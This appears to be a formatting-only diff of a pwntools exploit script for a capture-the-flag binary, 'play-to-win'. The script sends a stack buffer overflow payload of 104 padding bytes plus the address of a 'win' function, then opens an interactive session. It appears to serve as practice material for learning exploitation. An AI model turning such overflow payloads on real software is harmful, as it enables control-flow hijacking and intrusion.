@@ -15,12 +15,14 @@ exe = context.binary = ELF('./play-to-win')
 host = args.HOST or 'localhost'
 port = int(args.PORT or 20001)
 
+
 def local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
         return process([exe.path] + argv, *a, **kw)
+
 
 def remote(argv=[], *a, **kw):
     '''Connect to the process on the remote host'''
@@ -29,12 +31,14 @@ def remote(argv=[], *a, **kw):
         gdb.attach(io, gdbscript=gdbscript)
     return io
 
+
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
     if args.LOCAL:
         return local(argv, *a, **kw)
     else:
         return remote(argv, *a, **kw)
+
 
 # Specify your GDB script here for debugging
 # GDB will be launched if the exploit is run via e.g.
@@ -44,9 +48,9 @@ tbreak main
 continue
 '''.format(**locals())
 
-#===========================================================
+# ===========================================================
 #                    EXPLOIT GOES HERE
-#===========================================================
+# ===========================================================
 # Arch:     amd64-64-little
 # RELRO:    Partial RELRO
 # Stack:    No canary found
@@ -54,8 +58,7 @@ continue
 # PIE:      No PIE (0x400000)
 
 io = start()
-io.sendline(b'A' * 104 +  p64(exe.sym.win))
+io.sendline(b'A' * 104 + p64(exe.sym.win))
 
 
 io.interactive()
-
